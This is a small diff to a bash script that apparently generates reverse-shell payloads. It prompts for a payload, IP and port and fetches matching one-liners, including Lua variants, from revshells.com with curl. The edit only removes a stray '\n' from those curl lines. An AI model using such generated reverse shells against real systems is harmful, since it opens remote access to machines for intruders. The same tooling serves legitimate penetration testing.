@@ -190,9 +190,9 @@ read -p "Do you want to output to a file? (Y/N): " OUTPUT
 if [[ $OUTPUT == "Y" ]]
 then
     read -p "What do you want the name of the file to be? " FILENAME
-    curl "https://www.revshells.com/`echo $PAYLOAD | sed -e 's/ /%20/g'`?ip=$IP&port=$PORT&shell=sh&encoding=sh"\n > $FILENAME
+    curl "https://www.revshells.com/`echo $PAYLOAD | sed -e 's/ /%20/g'`?ip=$IP&port=$PORT&shell=sh&encoding=sh" > $FILENAME
 else
-    curl "https://www.revshells.com/`echo $PAYLOAD | sed -e 's/ /%20/g'`?ip=$IP&port=$PORT&shell=sh&encoding=sh"\n
+    curl "https://www.revshells.com/`echo $PAYLOAD | sed -e 's/ /%20/g'`?ip=$IP&port=$PORT&shell=sh&encoding=sh"
 fi
 
 if [[ $PAYLOAD == "Lua 1" ]]
@@ -202,3 +202,5 @@ elif [[ $PAYLOAD == "Lua 2" ]]
 then
     curl "https://www.revshells.com/Lua%20%232?ip=$IP&port=$PORT&shell=sh&encoding=sh"
 fi
+
+# 
